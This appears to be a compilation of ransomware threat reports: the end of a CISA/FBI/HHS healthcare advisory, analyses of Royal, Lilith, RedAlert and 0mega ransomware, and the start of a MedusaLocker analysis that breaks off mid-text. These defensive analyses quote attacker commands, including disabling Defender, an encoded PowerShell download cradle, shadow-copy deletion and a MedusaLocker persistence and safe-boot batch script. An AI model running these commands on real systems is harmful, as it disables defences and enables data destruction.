\n\nhttps://www.cisa.gov/publication/ransomware-guide\nhttps://h-isac.org/membership-account/join-h-isac/\nhttps://h-isac.org/membership-account/join-h-isac/\nhttps://www.nationalisacs.org/member-isacs\nhttps://www.isao.org/information-sharing-groups/\nhttps://usdhs-my.sharepoint.com/personal/sara_barker_associates_cisa_dhs_gov/Documents/Microsoft%20Teams%20Chat%20Files/cisa.gov\nhttps://us-cert.cisa.gov/mailing-lists-and-feeds\nmailto:central@cisa.gov\nhttps://usdhs-my.sharepoint.com/personal/sara_barker_associates_cisa_dhs_gov/Documents/Microsoft%20Teams%20Chat%20Files/ic3.gov\nhttp://www.fbi.gov/contact-us/field\nmailto:CyWatch@fbi.gov\nhttp://www.hhs.gov/hc3\nmailto:HC3@HHS.gov\n\n\n   \n \n \n\n  \nPage 18 of 22 |  Product ID: AA20-302A \n\nTLP:WHITE CISA  | FBI  | HHS \n     \n\nTLP:WHITE   \n\nEngaging with the H-ISAC, ISAO, CISA, FBI, and HHS/HC3 will enable your organization to receive \ncritical information and access to services to better manage the risk posed by ransomware and other \ncyber threats. \n\nFollow Ransomware Best Practices \nRefer to the best practices and references below to help manage the risk posed by ransomware and \nsupport your organization’s coordinated and efficient response to a ransomware incident. Apply these \npractices to the greatest extent possible based on availability of organizational resources. \n\n• It is critical to maintain offline, encrypted backups of data and to regularly test your backups. \nBackup procedures should be conducted on a regular basis. It is important that backups be \nmaintained offline or in separated networks as many ransomware variants attempt to find and \ndelete any accessible backups. Maintaining offline, current backups is most critical because \nthere is no need to pay a ransom for data that is readily accessible to your organization. \n\no Use the 3-2-1 rule as a guideline for backup practices. The rule states that three \ncopies of all critical data are retained on at least two different types of media and at \nleast one of them is stored offline. \n\no Maintain regularly updated “gold images” of critical systems in the event they need to \nbe rebuilt. This entails maintaining image “templates” that include a preconfigured \noperating system (OS) and associated software applications that can be quickly \ndeployed to rebuild a system, such as a virtual machine or server. \n\no Retain backup hardware to rebuild systems in the event rebuilding the primary system \nis not preferred. \n Hardware that is newer or older than the primary system can present installation or \n\ncompatibility hurdles when rebuilding from images. \n Ensure all backup hardware is properly patched. \n\n• In addition to system images, applicable source code or executables should be available \n(stored with backups, escrowed, license agreement to obtain, etc.). It is more efficient to \nrebuild from system images, but some images will not install on different hardware or \nplatforms correctly; having separate access to needed software will help in these cases. \n\n• Create, maintain, and exercise a basic cyber incident response plan and associated \ncommunications plan that includes response and notification procedures for a ransomware \nincident. \n\no Review available incident response guidance, such as CISA’s Technical Approaches \nto Uncovering and Remediating Malicious Activity https://us-\ncert.cisa.gov/ncas/alerts/aa20-245a. \n\n• Help your organization better organize around cyber incident response. \n• Develop a cyber incident response plan. \n• The Ransomware Response Checklist, available in the CISA and MS-ISAC Joint \n\nRansomware Guide, serves as an adaptable, ransomware- specific annex to organizational \ncyber incident response or disruption plans. \n\nhttps://us-cert.cisa.gov/ncas/alerts/aa20-245a\nhttps://us-cert.cisa.gov/ncas/alerts/aa20-245a\nhttps://www.cisa.gov/publication/ransomware-guide\nhttps://www.cisa.gov/publication/ransomware-guide\n\n\n   \n \n \n\n  \nPage 19 of 22 |  Product ID: AA20-302A \n\nTLP:WHITE CISA  | FBI  | HHS \n     \n\nTLP:WHITE   \n\n• Review and implement as applicable MITRE’s Medical Device Cybersecurity: Regional \nIncident Preparedness and Response Playbook \n(https://www.mitre.org/sites/default/files/publications/pr-18-1550-Medical-Device-\nCybersecurity-Playbook.pdf). \n\n• Develop a risk management plan that maps critical health services and care to the necessary \ninformation systems; this will ensure that the incident response plan will contain the proper \ntriage procedures. \n\n• Plan for the possibility of critical information systems being inaccessible for an extended \nperiod of time. This should include but not be limited to the following: \n\no Print and properly store/protect hard copies of digital information that would be \nrequired for critical patient healthcare.  \n\no Plan for and periodically train staff to handle the re-routing of incoming/existing \npatients in an expedient manner if information systems were to abruptly and \nunexpectedly become unavailable. \n\no Coordinate the potential for surge support with other healthcare facilities in the greater \nlocal area. This should include organizational leadership periodically meeting and \ncollaborating with counterparts in the greater local area to create/update plans for their \nfacilities to both abruptly send and receive a significant amount of critical patients for \nimmediate care. This may include the opportunity to re-route healthcare employees \n(and possibly some equipment) to provide care along with additional patients. \n\n• Consider the development of a second, air-gapped communications network that can provide \na minimum standard of backup support for hospital operations if the primary network becomes \nunavailable if/when needed. \n\n• Predefine network segments, IT capabilities and other functionality that can either be quickly \nseparated from the greater network or shut down entirely without impacting operations of the \nrest of the IT infrastructure. \n\n• Legacy devices should be identified and inventoried with highest priority and given special \nconsideration during a ransomware event. \n\n• See CISA and MS-ISAC's Joint Ransomware Guide for infection vectors including internet-\nfacing vulnerabilities and misconfigurations; phishing; precursor malware infection; and third \nparties and managed service providers.  \n\n• HHS/HC3 tracks ransomware that is targeting the HPH Sector; this information can be found \nat http://www.hhs.gov/hc3. \n\nHardening Guidance \n• The Food and Drug Administration provides multiple guidance documents regarding the \n\nhardening of healthcare and specifically medical devices found here: \nhttps://www.fda.gov/medical-devices/digital-health-center-excellence/cybersecurity. \n\n• See CISA and MS-ISAC's Joint Ransomware Guide for additional in-depth hardening \nguidance. \n\nhttps://www.mitre.org/sites/default/files/publications/pr-18-1550-Medical-Device-Cybersecurity-Playbook.pdf\nhttps://www.mitre.org/sites/default/files/publications/pr-18-1550-Medical-Device-Cybersecurity-Playbook.pdf\nhttps://www.cisa.gov/publication/ransomware-guide\nhttp://www.hhs.gov/hc3\nhttps://www.fda.gov/medical-devices/digital-health-center-excellence/cybersecurity\nhttps://www.cisa.gov/publication/ransomware-guide\n\n\n   \n \n \n\n  \nPage 20 of 22 |  Product ID: AA20-302A \n\nTLP:WHITE CISA  | FBI  | HHS \n     \n\nTLP:WHITE   \n\nContact CISA for These No-Cost Resources \n• Information sharing with CISA and MS-ISAC (for SLTT organizations) includes bi-directional \n\nsharing of best practices and network defense information regarding ransomware trends and \nvariants as well as malware that is a precursor to ransomware. \n\n• Policy-oriented or technical assessments help organizations understand how they can \nimprove their defenses to avoid ransomware infection: https://www.cisa.gov/cyber-resource-\nhub.  \n\no Assessments include Vulnerability Scanning and Phishing Campaign Assessment. \n\n• Cyber exercises evaluate or help develop a cyber incident response plan in the context of a \nransomware incident scenario. \n\n• CISA Cybersecurity Advisors (CSAs) advise on best practices and connect you with CISA \nresources to manage cyber risk. \n\n• Contacts: \no SLTT organizations: CyberLiaison_SLTT@cisa.dhs.gov \no Private sector organizations: CyberLiaison_Industry@cisa.dhs.gov  \n\nRansomware Quick References \n• Ransomware: What It Is and What to Do About It (CISA): General ransomware guidance for \n\norganizational leadership and more in-depth information for CISOs and technical staff: \nhttps://www.us-cert.cisa.gov/sites/default/files/publications/Ransomware_Executive_One-\nPager_and_Technical_ Document-FINAL.pdf  \n\n• Ransomware (CISA): Introduction to ransomware, notable links to CISA products on \nprotecting networks, specific ransomware threats, and other resources: https://www.us-\ncert.cisa.gov/Ransomware   \n\n• HHS/HC3: Ransomware that impacts HPH is tracked by the HC3 and can be found at \nwww.hhs.gov/hc3  \n\n• Security Primer – Ransomware (MS-ISAC): Outlines opportunistic and strategic ransomware \ncampaigns, common infection vectors, and best practice recommendations: \nhttps://www.cisecurity.org/white-papers/security-primer-ransomware/  \n\n• Ransomware: Facts, Threats, and Countermeasures (MS- ISAC): Facts about ransomware, \ninfection vectors, ransomware capabilities, and how to mitigate the risk of ransomware \ninfection: https://www.cisecurity.org/blog/ransomware- facts-threats-and-countermeasures/ \n\n• HHS Ransomware Fact Sheet: \nhttps://www.hhs.gov/sites/default/files/RansomwareFactSheet.pdf \n\n• NIST Securing Data Integrity White Paper: https://csrc.nist.gov/publications/detail/white-\npaper/2020/10/01/securing-data-integrity-against-ransomware-attacks/draft \n\nRansomware Response Checklist \nRemember: Paying the ransom will not ensure your data is decrypted or that your systems or \ndata will no longer be compromised.

      "plain_text": "1/13\n\nRoyal Ransomware Deep Dive\nkroll.com/en/insights/publications/cyber/royal-ransomware-deep-dive\n\nThe threat actor group behind Royal ransomware first appeared in January 2022, pulling\ntogether actors previously associated with Roy/Zeon, Conti and TrickBot malware. Originally\nknown as “Zeon” before renaming themselves “Royal” in September 2022, they are not\nconsidered a ransomware-as-a-service (RaaS) operation because their coding/infrastructure\nare private and not made available to outside actors. Since the start of 2023, they have\nescalated their attacks to focus on top tier corporations for larger ransoms. Their ransoms\nreportedly range from $250,000 to over $2 million. Although known for using the double\nextortion method of both encrypting and exfiltrating data, as of this writing the group does not\nhave a data leak site where they publish the names of their victims.\n\nUntil recently, the Royal group was observed primarily targeting systems running Windows\noperating system; however, reports surfaced in February 2023 of a variant able to\ncompromise Linux/virtual machines.\n\nhttps://www.kroll.com/en/insights/publications/cyber/royal-ransomware-deep-dive\nhttps://www.bleepingcomputer.com/news/security/new-royal-ransomware-emerges-in-multi-million-dollar-attacks/\nhttps://www.kroll.com/en/insights/publications/cyber/cyber-extortion-email-compromises\nhttps://www.bleepingcomputer.com/news/security/new-royal-ransomware-emerges-in-multi-million-dollar-attacks/\nhttps://www.secureblink.com/cyber-security-news/royal-ransomware-latest-threat-to-encrypt-linux-devices\n\n\n2/13\n\nTo gain initial access into a victim network, the group has seemed to favor call-back phishing\nploys, often impersonating food delivery or software providers needing subscription\nrenewals. After a victim calls the telephone number in the phishing email to dispute/cancel\nthe supposed subscription, the victim is persuaded by the threat actor to install remote\naccess software on their computer, thereby providing the actors with initial access to their\norganization’s network.\n\nOpen and closed-source intelligence has also reported the group exploiting web\nvulnerabilities to compromise networks, indicating a potentially greater level of sophistication\nthan the call-back scheme suggests. Another initial access method associated with the group\nis the abuse of Google Ads to deliver malware: users browsing the internet click on ads they\nbelieve to be legitimate, but ultimately lead to downloads of BatLoader, a multifaceted initial\naccess malware. Other tools utilized by Royal include the post exploitation framework Cobalt\nStrike for persistent access along with PowerSploit, common remote access tools and\nexfiltration tools such as MegaCMD and SharpExfiltrate.\n\nKroll Case Study\n\n \n\nFigure 1 - Tactics, Techniques and Procedures (TTPs) of Recent Royal Ransomware\nInvestigation\n\nInitial Exploit\n\nhttps://www.bleepingcomputer.com/news/security/new-royal-ransomware-emerges-in-multi-million-dollar-attacks/\nhttps://www.kroll.com/en/insights/publications/cyber/threat-actors-google-ads-deploy-vidar-stealer\nhttps://twitter.com/VK_Intel/status/1580300511081029632\n\n\n3/13\n\nIn one incident, Kroll’s review of the available evidence suggested that the Royal\nransomware actors likely gained access into the environment by purchasing their way in from\nan unrelated actor; many actors are known to serve as “brokers” for such access. Kroll\ndetermined that a renamed version of the remote access and management software\nNetSupport Manager was installed during a previous incident on the victim’s network. In\nKroll’s experience investigating similar attack patterns, a phishing email most likely delivered\nan .iso file for the software; however, due to the passage of time and normal rollover of logs,\nno remnant of a potential phishing email existed at the time of the investigation. In Kroll’s\nexperience, the time between the initial installation of the remote access tool and when it\nwas ultimately used by Royal ransomware actors indicated that the software was not\ninstalled by the ransomware actors, but rather they purchased the access.\n\nMITRE ATT&CK: T1588: Obtain Capabilities\n\nInternal Scouting\n\nKroll observed the Royal actors using the network scanning tool Netscan to identify network\nshares and other network information. While Netscan is legitimate open-source software,\nmany threat actors are known to use it for reconnaissance because the tool is lightweight\nand provides an extensive suite of network scanning capabilities. ADFind was also identified\nas a method to enumerate domain members and groups. In addition, the threat actors used\nbatch scripts to ping, or identify, other systems on the network, along with common\ncommands such as “net user” and “net localgroup” to gain an understanding of the\nenvironment.\n\nMITRE ATT&CK: T1087: Account Discovery\n\nMITRE ATT&CK: T1016: System Network Configuration Discovery\n\n\nMITRE ATT&CK: T1135: Network Share Discovery\n\nToolkit Deployment\n\nThe Royal threat actors leveraged legitimate remote access tools such as Splashtop, Atera\nAgent and AnyDesk to maintain command and control (C2) within the environment. The use\nof all of these tools is not uncommon, as they provide guaranteed persistence by ensuring a\nnumber of channels are available for re-entry. The actors additionally deployed Cobalt Strike\nto maintain control via an HTTPS malleable C2 configuration, commonly with recently\nregistered domains (Figure 2).\n\nhttps://attack.mitre.org/software/S0552/\n\n\n4/13\n\n\"HttpPostUri\": \"/jquery-3.3.2.min.js\",\n\n\"Malleable_C2_Instructions\": [\n\n   \"Remove 1522 bytes from the end\",\n\n   \"Remove 84 bytes from the beginning\",\n\n   \"Remove 3931 bytes from the beginning\",\n\n   \"Base64 URL-safe decode\",\n\n   \"XOR mask w/ random key\"\n\n ],\n\nFigure 2 - Malleable Cobalt Strike C2 Configuration\n\nMITRE ATT&CK: T1219: Remote Access Software\n\nMITRE ATT&CK: T1001: Data Obfuscation\n\n\nMITRE ATT&CK: T1573.001: Encrypted Channel: Symmetric Cryptography\n\nTo enable the deployment of the ransomware, Royal actors are known to disable antivirus\nsoftware, such as Microsoft Defender, with PowerShell commands (Figure 3) as well as tools\nsuch as PowerTool64.exe and GMER to remove endpoint detection and response (EDR)\nsoftware. Both GMER and PowerTool64 are designed to remove rootkit type malware, but\ncan also be used maliciously to remove applications at the kernel level. These tools can\nprevent the creation of handles, threads and processes from software such as EDR, which in\nturn can prevent the detection of other malicious tools.\n\nC:\\Windows\\system32\\windowspowershell\\v1.0\\powershell.exe -Command Set-MpPreference -\nDisableRealtimeMonitoring $true\n\n\nFigure 3 - PowerShell Command to Disable Windows Defender\n\nMITRE ATT&CK: T1562.001: Impair Defenses: Disable or Modify Tools\n\nEscalation\n\nOur investigators observed the threat actors leveraging the common post exploitation tool\nPowerSploit, in particular via the Find-LocalAdminAccess module, in order to identify\nmachines where the current user has local administrator privileges (Figures 4 and 5).\n\npowershell -nop -exec bypass -EncodedCommand \nSQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEA\nG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOg\nAxADgAMAAxADUALwAnACkAOwAgAEYAaQBuAGQALQBMAG8AYwBhAGwAQQBkAG0AaQBuAEEAYwBjAGUAcwBzAA=\n=\n\nFigure 4 - PowerShell PowerSploit Execution\n\nIEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:18015/'); Find-\nLocalAdminAccess\n\nFigure 5 - PowerSploit Find-LocalAdminAccess\n\n\n\n5/13\n\nMITRE ATT&CK: T1807.001: Account Discovery: Local Account\n\nLateral Movement\n\nRoyal actors leverage the information gained from PowerSploit to navigate around the\nnetwork via Remote Desktop Protocol (RDP) before installing remote access tools and\ndisabling antivirus/EDR as they land on new devices. Cobalt Strike is also used to pass\nexplicit credentials to conduct activities across the network.\n\nMITRE ATT&CK: T1021.001: Remote Services: Remote Desktop Protocol\n\nMission Execution\n\nAs Royal actors employ the double extortion strategy, one of their main aims is to identify\nand exfiltrate sensitive information. The group uses a number of tools to extract files to cloud\nstorage stealthily via automations, including SharpExfiltrate and Megacmd.exe.\n\nMITRE ATT&CK: T1537: Transfer Data to Cloud Account\n\nMITRE ATT&CK: T1020: Automated Exfiltration\n\nOnce data is exfiltrated, Royal actors will then execute the ransomware binary. This is\ntypically undertaken by a batch script that lists computers, the unique identification key and\nthe percentage of file encryption to use in values between 1 and 100 (Figure 6).\n\nstart locker.exe -ep 5 -id  -path \\\\ENDPOINT.DOMAIN.COM\\C$ \n\nstart locker.exe -ep 5 -id  -path \\\\ENDPOINT2.DOMAIN.COM\\C$ \n\nstart locker.exe -ep 5 -id  -path \\\\ENDPOINT3.DOMAIN.COM\\C$ \n\nFigure 6 - Example Batch Script to Launch the Ransomware Binary\n\nMITRE ATT&CK: T1059.003: Command and Scripting Interpreter: Windows Command Shell\n\nMITRE ATT&CK: T1064: Scripting\n\nThe analyzed sample depicted in Figure 7 is a 32-bit Portable Executable written in C++;\nKroll’s malware analysis team was able to determine the exact date and time when this was\ncompiled. When run from the command line, the ransomware accepts three arguments:\n\n-path (the path to be encrypted)\n-id (a 32-character alphanumeric ID unique to the victim, which will also be appended\nto the Tor URL)\n-ep (percentage of the file to be encrypted. It accepts values between 1 and 100, and if\na value is given that is not in the range 1-100, the ransomware will encrypt 50%)\n\n \n\nhttps://mega.io/cmd\n\n\n6/13\n\nFigure 7 - Ransomware Configuration Detailing Command Arguments\n\nAfter parsing the command line arguments, the ransomware deletes the Volume Shadow\nCopies to prevent restoration (Figure 8). It achieves this by creating a new vssadmin.exe\nprocess with the argument \"delete shadows /all /quiet\".\n\n\n\n7/13\n\nFigure 8 - Ransomware Configuration Detailing Volume Shadow Copy Deletion\n\nThe ransomware ensures that the -id parameter is 32 characters long and that the current\npath does not contain certain file extensions (such as .exe, .dll or .bat) or already encrypted\nfiles (with extension .royal). It then proceeds with the encryption routine, which uses\nAdvanced Encryption Standard (AES). It finally writes the ransom note in a file named\n“README.TXT” (Figure 9). The note’s text is contained within the .rdata section of the\nexecutable, along with the RSA public key and other strings used by the program.\n\n\n\n8/13\n\nHello!\n\n\nIf you are reading this, it means that your system were hit by Royal \nransomware.\n\n\nPlease contact us via :\n\nhttp[:]//royal2xthig3ou5hd7zsliqagy6yygk2cdelaxtni2fyad6dpmpxedid[.]onion/ \n\n\nIn the meantime, let us explain this case.It may seem complicated, but it is not!\n\nMost likely what happened was that you decided to save some money on your security \ninfrastructure.\n\nAlas, as a result your critical data was not only encrypted but also copied from your \nsystems on a secure server.\n\nFrom there it can be published online.Then anyone on the internet from darknet \ncriminals, ACLU journalists, Chinese government(different names for the same thing),\n\nand even your employees will be able to see your internal documentation: personal \ndata, HR reviews, internal lawsuitsand complains, financial reports, accounting, \nintellectual property, and more!\n\n\nFortunately we got you covered!\n\n\nRoyal offers you a unique deal.For a modest royalty(got it; got it ? ) for our \npentesting services we will not only provide you with an amazing risk mitigation \nservice,\n\ncovering you from reputational, legal, financial, regulatory, and insurance risks, \nbut will also provide you with a security review for your systems.\n\nTo put it simply, your files will be decrypted, your data restored and kept \nconfidential, and your systems will remain secure.\n\n\nTry Royal today and enter the new era of data security!\n\nWe are looking to hearing from you soon!\n\nFigure 9 - Ransom Note README.TXT Created by the Ransomware Binary\n\nThe link within the ransom note directs the victim to a simple chat portal for the victim to\nnegotiate the ransom (Figure 10).\n\nMITRE ATT&CK: T1486: Data Encrypted for Impact \n\nMITRE ATT&CK: T1490: Inhibit System Recovery\n\n\n\n9/13\n\nFigure 10 - Royal Negotiation Site on Tor (Source: Bleeping Computer)\n\nIf a ransom is not agreed, the actors claim they will post the victim’s exfiltrated information on\ntheir data leak site.

It has quickly become one of the most\nprominent and profitable types of malware for Threat Actors (TAs).\n\nIn a typical scenario, the ransomware infection starts with the TA gaining access to the target device.\nDepending on the type of ransomware, it can infect the entire operating system or encrypts\nindividual files. The TAs will then typically demand payment from the victim for the decryption of their\nfiles.\n\nMultiple new ransomware groups have surfaced recently, highlighting the adoption of ransomware\nattacks by TAs for monetary gains. A few of them include:\n\nRedAlert Ransomware\n\nhttps://blog.cyble.com/2022/07/12/new-ransomware-groups-on-the-rise/\n\n\n2/11\n\nRedAlert or N13V is a new ransomware strain that targets both Windows and Linux VMWare ESXi\nservers on corporate networks. The ransomware stops all running virtual machines and encrypts any\nfile related to virtual machines, such as virtual disks. RedAlert Ransomware was named after a\nstring with the same name in the ransom note, but threat actors named their campaign “N13V”.\nRedAlert only accepts ransom payments in Monero, which is rather atypical for ransomware groups.\n\nRedAlert ransomware has manual operations, which means TAs execute the ransomware after a\ncomplete takeover of the victim system. The ransomware binary provides various options to the TAs\nfor performing pre-encryption operations such as stopping all virtual machines running on VMware\nESXi, Asymmetric cryptography performance tests, etc.\n\nThe ransomware uses NTRUEncrypt public key encryption algorithm for encryption. The\nransomware only targets log files (.log), swap files(.vswp), virtual disks(.vmdk), snapshot files\n(.vmsn) and memory files(.vmem) of VMware ESXi virtual machines. After encryption the\nransomware appends a  “.crypt[Random number]” extension to the file.\n\nThe figure below shows the leak site of RedAlert ransomware.\n\nFigure 1 – RedAlert Ransomware Leak Site\n\n0mega Ransomware\n\nAnother new ransomware gang, “0mega,” is suspected of targeting organizations using Double\nExtortion techniques. The indicators of compromise of this ransomware strain are unavailable in the\nwild.\n\nStill, as per researchers’ comments, the ransomware appends the files with the “.0mega” extension\nand creates ransom notes named “DECRYPT-FILES.txt.”\n\nThe figure below shows the 0mega Ransomware data leak site.\n\nhttps://www.bleepingcomputer.com/news/security/new-redalert-ransomware-targets-windows-linux-vmware-esxi-servers/\n\n\n3/11\n\nFigure 2 – 0mega Ransomware Leak Site\n\nLilith Ransomware\n\nRansomware operators now have another new tool at their disposal, named Lilith Ransomware. This\nthreat can affect many file types and render them completely unusable.\n\nLilith ransomware encrypts files on the victim’s machine and appends the extension of encrypted\nfiles as “.lilith.” Afterward, a ransom note is created on the system to demand payment.\n\nIn this report, Cyble Research Labs conducts a deep analysis of Lilith ransomware to understand its\nbehavior and infection mechanism.\n\nTechnical Analysis: Lilith Ransomware\n\nStatic analysis indicates that the Lilith ransomware file is a console-based x64 architecture\nexecutable written in C/C++, as shown below.\n\nFigure 3 – Static information of LILITH Ransomware\n\n\n\n4/11\n\nUpon execution, Lilith ransomware initially searches for a list of hardcoded processes in the file and\nterminates its execution if any of them are running on the target’s machine. This step ensures that\nthese processes do not block access to the files to be encrypted.\n\nThe below figure shows the APIs used to kill the process execution by the ransomware.\n\nFigure 4 – APIs used to Terminate Process Execution\nA full list of hardcoded process names is shown in the below figure.\n\nFigure 5 – List of\n\nProcesses for Termination\nTo identify the services running in the machine, the ransomware first calls “OpenSCManagerA()”\nAPI, which establishes a connection to the service control manager that gives the TAs access to the\nservice control manager database.\n\nUpon gaining access to this database, the following APIs() will be called:\n\nOpenServiceA() – Opens the specified service.\nQueryServiceStatusEx() – Gets the status of the service.\n\n\n\n5/11\n\nEnumDependentServiceA() – Retrieves the dependent services.\nControlService() – takes control of the service for stopping.\n\nIf the “OpenSCManagerA()” API fails to get the handle to Service Control Manager (SCM), then the\nransomware skips calling the below service-related APIs.\n\nFigure 6 – Service-Related APIs\nAfter that, the ransomware enumerates and gets the system drive information of the victim’s\nmachine by using the below APIs such as GetDriveTypeW(), FindFirstVolumeW(), and\nFindNextVolumeW().\n\nFigure 7 – System Drive Related APIs\nBefore initiating the encryption process, the ransomware drops the ransom note in multiple folders\nwith the file name “Restore_Your_Files.txt.” The ransomware creates a ransom note with the content\nshown in the figure below.\n\nFigure 8 – Malware Writes Ransom Notes\nThe ransomware searches for files to encrypt on the local system by enumerating the file directories\nusing FindFirstFileW() and FindNextFileW() API functions. It ignores the file extensions such as\nEXE, DLL, and SYS and excludes a list of directory and file names from the encryption process\n(Figure 9).\n\nInterestingly, the exclusion list contains the filename “ecdh_pub_k.bin,” which stores the local public\nkey of BABUK ransomware for file decryption.\n\n\n\n6/11\n\nFigure 9 –\n\nExclusion List of Folder and File names\nThe malware uses cryptographic APIs such as CryptAcquireContextW() and CryptGenRandom()\nfrom ADVAPI32.dll to encrypt victims’ files. The ransomware generates a random key with the\nfunction “CryptGenRandom()” and then encrypts the files using an encryption routine as shown\nbelow.\n\n\n\n7/11\n\nFigure 10 – Encryption Routine\nThe figure below shows the WriteFile operation and the original/infected file content before and after\nencryption.\n\nFigure 11 – WriteFile() Operation\nFinally, the malware renames the encrypted file with the “.lilith” extension and replaces it with the\noriginal file by using the “MoveFileExW()” API, as shown below.\n\n\n\n8/11\n\nFigure 12 – MoveFileExW() API\nThe below figure shows the encrypted files by Lilith ransomware after the successful infection of a\nvictim’s machine.\n\nFigure 13 – Files Encrypted by Lilith Ransomware\nIn the dropped ransom note, victims are given three days to negotiate the price with the TAs for the\ndecryption software. At the end of this deadline, the TAs threaten to begin leaking personal data if\nthe ransom is not paid.  \n\nThe ransom note also contains the poison ID for TOX communication and the Onion URL of the leak\nsite page – shown in the figure below.\n\n\n\n9/11\n\nFigure 14 – Ransom Note\nThe figure below shows the Onion leak site home page of Lilith ransomware.\n\nFigure 15 – Onion Leak Site\n\nConclusion\n\n\n\n10/11\n\nRansomware groups continue to pose a severe threat to firms and individuals. Organizations need\nto stay ahead of the techniques used by TAs besides implementing the requisite security\nbest practices and security controls.\n\nRansomware victims are at risk of losing valuable data as a result of such attacks, resulting in\nfinancial loss and lost productivity. If the victim is unable or unwilling to pay the ransom, the TAs may\nleak or sell this data online, compromising sensitive user data for businesses and individuals and\nresulting in a loss of reputation for the affected organization(s). \n\nThroughout 2021 and 2022, we have observed record levels of ransomware activity. While notable\nexamples of this are rebrands of existing groups, newer groups like LILITH, RedAlert, and 0mega\nare also proving to be potent threats.\n\nCyble Research Labs continuously monitors new ransomware campaigns and will keep our readers\nupdated.\n\nOur Recommendations\n\nWe have listed some essential cybersecurity best practices that create the first line of control against\nattackers. We recommend that our readers follow the best practices given below:\n\nSafety Measures Needed to Prevent Ransomware Attacks\n\nConduct regular backup practices and keep those backups offline or in a separate network.\nTurn on the automatic software update feature on your computer, mobile, and other connected\ndevices wherever possible and pragmatic. \nUse a reputed anti-virus and Internet security software package on your connected devices,\nincluding PC, laptop, and mobile.\nRefrain from opening untrusted links and email attachments without verifying their authenticity.\n\nUsers Should Take the Following Steps After the Ransomware Attack\n\nDetach infected devices on the same network.\nDisconnect external storage devices if connected.\nInspect system logs for suspicious events.\n\nImpacts And Cruciality of Ransomware\n\nLoss of Valuable data.\nLoss of the organization’s reputation and integrity.\nLoss of the organization’s sensitive business information.\nDisruption in organization operation.\nFinancial loss.\n\nMITRE ATT&CK® Techniques\n\nTactic Technique ID Technique Name\n\n\n\n11/11\n\nExecution T1204 User Execution\n\nDiscovery T1012 \n\nT1082\n\nT1083\n\nQuery Registry \n\nSystem Information Discovery \n\n\nFile and Directory Discovery\n\nDefense Evasion T1027 Obfuscated Files or Information\n\nImpact T1486 Data Encrypted for Impact\n\nIndicator Of Compromise (IOCs)\n\nIndicators Indicator\n\nType\n\nDescription\n\nb7a182db3ba75e737f75bda1bc76331a\ncf0fe28214ad4106c48ec5867327319eaa82b3c3\nf3caa040efb298878b99f883a898f76d92554e07a8958e90ff70e7ff3cfabdf5\n\nMD5\nSHA1\nSha256\n\nLILITH\nRansomware\nx64 EXE file\n\nf2fa9a3ce883a7f5b43ba5c9ff7bdf75\nda6a7e9d39f6a9c802bbd1ce60909de2b6e2a2aa\n039e1765de1cdec65ad5e49266ab794f8e5642adb\n0bdeb78d8c0b77e8b34ae09\n\nMD5\nSHA1\nSha256\n\nRedAlert\nRansomware\nLinux file\n(elf)\n\nhttps://attack.mitre.org/techniques/T1204/\nhttps://attack.mitre.org/techniques/T1012/\nhttps://attack.mitre.org/techniques/T1082/\nhttps://attack.mitre.org/techniques/T1083\nhttps://attack.mitre.org/techniques/T1027\nhttps://attack.mitre.org/techniques/T1486/",

      "plain_text": "Cybereason vs. MedusaLocker Ransomware\n\n\nCybereason vs. MedusaLocker Ransomware\ncybereason.com/blog/medusalocker-ransomware\n\nBack to Blog\nCybereason Nocturnus\nNov 19, 2020\n\nResearch by: Tom Fakterman and Assaf Dahan\n\nBackground\n\nThe MedusaLocker ransomware first emerged in September 2019, infecting and encrypting Windows machines around the world. There have\nbeen reports of MedusaLocker attacks across multiple industries, especially the healthcare industry which suffered a great deal of ransomware\nattacks during the COVID-19 pandemic.\n\nIn order to maximize the chances of successful encryption of the files on the compromised machine, MedusaLocker restarts the machine in safe\nmode before execution. This method is used to avoid security tools that might not run when the computer starts in safe mode.\n\nMedusaLocker avoids encrypting executable files, most likely to avoid rendering the targeted system unusable for paying the ransom. To make it\neven more dangerous, MedusaLocker uses a combination of AES and RSA-2048, making the procedure of brute forcing the encryption\npractically impossible.\n\nRecently, there have been reports stating that AKO, a variant of MedusaLocker, added an element of blackmail, threatening to release stolen files\npublicly. This method of blackmail or extortion is starting to gain popularity in the ransomware market as reported by Cybereason earlier this\nyear.\n\nAlthough data leak extortion threats have been found in some of MedusaLocker’s ransom notes, Cybereason did not observe evidence of\ninformation actually being exfiltrated by the MedusaLocker ransomware at the time of this research.\n\nCybereason Blocks MedusaLocker Ransomware\n\nKey Points\n\n1. High Severity: The Cybereason Nocturnus Team assesses the threat level as HIGH given the destructive potential of attack.\n\n2. Encrypting mapped drives: MedusaLocker encrypts shared network drives of adjacent machines on the network.\n\n3. Attempted extortion: The ransom note left by new MedusaLocker variants contains threats to publicly reveal stolen data if payments are\nnot made.\n\n4. Detected and Prevented: Cybereason’s platform fully detects and prevents the MedusaLocker ransomware.\n\nBreaking Down the Attack\n\nMany MedusaLocker infections typically start with two files, a ‘batch’ file and a powershell script saved as a ‘txt’ file:\n\nqzy.bat\nqzy.txt\n\nContents of the Batch file\n\nThe qzy.bat file deployed by the attackers is designed to create persistence via a Windows Service. The service does the following tasks:\n\n1. Executes a Powershell script that resides in C:\\Windows\\SysWOW6\\qzy.txt, which contains the Ransomware payload.\n\n2. Changes registry keys to allow the service to run in safe mode.\n\n3. Enforce restart in safe mode.\n\n4. Restart the infected host.\n\nsc create purebackup binpath= \"%COMSPEC% /C start /b C:\\Windows\\SysWow64\\WindowsPowerShell\\v1.0\\powershell.exe -c $km =\n[IO.File]::ReadAllText('C:\\Windows\\SysWOW64\\qzy.txt'); IEX $km\" start= auto DisplayName= \"purebackup\"\n\nreg add HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\BackupLP /f\n\nreg add HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\BackupLP /ve /d \\\"Service\\\" /f\n\nbcdedit /set {default} safeboot minimal\n\nshutdown /r /f /t 00 & del %0\n\nThe batch file execution portrayed in Cybereason attack 